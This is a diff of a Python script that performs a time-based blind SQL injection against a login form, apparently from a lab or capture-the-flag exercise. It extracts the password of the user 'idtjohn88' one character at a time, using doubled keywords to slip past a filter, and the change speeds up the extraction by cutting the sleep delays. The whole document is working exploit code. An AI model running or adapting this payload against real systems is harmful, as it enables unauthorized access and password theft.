@@ -37,7 +37,7 @@ combined_list = lowercase_letters + uppercase_letters + digits + special_charact
 # Measure the time taken for the request
 for char in combined_list:
     # SQL injection
-    data["username"] = f"' oorr IF((BINARY SUBSTRING((sselectelect `passwoorrd` from users wwherehere `username`='idtjohn88'),1,1)='{char}'), SLEEP(5),0) -- "
+    data["username"] = f"' oorr IF((BINARY SUBSTRING((sselectelect `passwoorrd` from users wwherehere `username`='idtjohn88'),7,1)='{char}'), SLEEP(1),0) -- "
 
     start_time = time.time()
     response = requests.post(url, data=data, headers=headers)
@@ -46,7 +46,7 @@ for char in combined_list:
     # Calculate the duration
     duration = end_time - start_time
     print("char: " + char + "  Duration: " + str(duration) + " seconds")
-    time.sleep(1)
+    # time.sleep(1)
 
 
 
